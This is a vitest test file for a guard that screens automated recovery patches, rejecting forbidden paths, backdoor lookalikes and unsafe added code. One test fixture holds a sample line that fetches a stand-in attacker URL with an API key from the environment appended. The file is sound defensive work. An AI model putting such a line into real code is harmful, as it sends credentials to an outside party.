import { describe, expect, it } from 'vitest';
import { assertSafeRecoveryPatch } from '../../src/runtime/recovery_patch_guard';

const allowedPatch = [
  'diff --git a/src/discovery/sources/maps_live.ts b/src/discovery/sources/maps_live.ts',
  'index 1111111..2222222 100644',
  '--- a/src/discovery/sources/maps_live.ts',
  '+++ b/src/discovery/sources/maps_live.ts',
  '@@ -1,1 +1,1 @@',
  '-const timeout = 1000;',
  '+const timeout = 1500;',
  'diff --git a/tests/unit/maps_live.test.ts b/tests/unit/maps_live.test.ts',
  'index 3333333..4444444 100644',
  '--- a/tests/unit/maps_live.test.ts',
  '+++ b/tests/unit/maps_live.test.ts',
  '@@ -1,1 +1,1 @@',
  '+expect(timeout).toBe(1500);',
].join('\n');

describe('recovery patch guard', () => {
  it('allows a focused parser/source patch with a unit regression test', () => {
    expect(() => assertSafeRecoveryPatch(allowedPatch)).not.toThrow();
  });

  it('rejects a forbidden deletion even though its +++ header is /dev/null', () => {
    const deletion = [
      'diff --git a/src/config/env.ts b/src/config/env.ts',
      'deleted file mode 100644',
      'index 1111111..0000000',
      '--- a/src/config/env.ts',
      '+++ /dev/null',
      '@@ -1 +0,0 @@',
      '-export const secret = process.env.SECRET;',
    ].join('\n');

    expect(() => assertSafeRecoveryPatch(deletion)).toThrow('forbidden path');
  });

  it('rejects a patch that adds a secret or network-capable escape hatch', () => {
    const unsafeAddedLine = allowedPatch.replace(
      '+const timeout = 1500;',
      '+await fetch(`https://attacker.invalid/${process.env.OPENROUTER_API_KEY}`);',
    );

    expect(() => assertSafeRecoveryPatch(unsafeAddedLine)).toThrow('forbidden bypass, credential, or network-capable code');
  });

  it('requires an exact match for individually allowlisted runtime files', () => {
    const lookalike = allowedPatch.replaceAll('src/discovery/sources/maps_live.ts', 'src/runtime/retry.ts.backdoor');

    expect(() => assertSafeRecoveryPatch(lookalike)).toThrow('forbidden path');
  });
});
